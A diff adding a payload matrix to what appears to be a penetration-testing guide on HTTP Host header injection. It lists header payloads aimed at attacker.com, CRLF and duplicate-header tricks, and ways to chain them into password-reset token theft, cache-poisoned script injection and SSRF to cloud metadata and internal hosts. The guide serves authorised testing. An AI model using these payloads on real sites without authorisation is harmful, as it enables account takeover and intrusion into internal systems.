@@ -31,6 +31,52 @@ nist_csf:
 - During penetration testing of applications behind reverse proxies or load balancers
 - When evaluating SSRF potential through Host header manipulation
 
+## Critical: Payload Matrix and Bypasses (checklist-derived)
+
+### Headers to try (one per request, then in combination)
+```
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+X-Forwarded-Server: attacker.com
+X-Host: attacker.com
+X-Forwarded-For: attacker.com
+Forwarded: host=attacker.com
+```
+
+### Injection techniques
+```
+# Duplicate Host headers (front-end reads first, back-end reads second or vice-versa)
+Host: target.com
+Host: attacker.com
+
+# Absolute-URL request line (request line host vs Host header mismatch)
+GET https://target.com/ HTTP/1.1
+Host: attacker.com
+
+# Host with port / userinfo confusion
+Host: target.com:@attacker.com
+Host: target.com:80@attacker.com
+Host: attacker.com:80
+
+# CRLF dual host / header injection
+Host: target.com%0d%0aHost: attacker.com
+
+# Line wrapping (leading space/tab continuation — some parsers fold it)
+Host: target.com
+ Host: attacker.com
+```
+
+### Impacts to chain toward
+- **Password-reset poisoning:** trigger reset with a poisoned `Host`/`X-Forwarded-Host`; the reset email link is built from the header and points to the attacker, leaking the token when the victim clicks.
+- **Web-cache poisoning:** if the cache key excludes Host but the response reflects it (e.g., `<script src="//attacker.com/app.js">`), the poisoned response is served to all users — stored XSS at scale.
+- **Routing-based SSRF:** the front-end proxies to the host in the header, letting you reach internal hosts (`Host: 169.254.169.254`, `Host: 127.0.0.1:8080`) or internal vhosts.
+- **Secondary-context / access-control bypass:** route to unprotected backend vhosts (`Host: admin.internal`, `Host: localhost`) the front-end normally guards.
+
+### Confirmation
+- The injected host is **reflected** in the response body, in absolute links/`<script>`/`<link>` `src`/`href`, or in a `Location` redirect.
+- A **poisoned password-reset email** arrives containing the attacker host in the reset URL.
+- For routing SSRF, an **OOB hit** lands on Collaborator/interactsh, or internal content is returned.
+
 ## Prerequisites
 - Burp Suite for intercepting and modifying Host headers
 - Understanding of HTTP Host header role in virtual hosting and routing
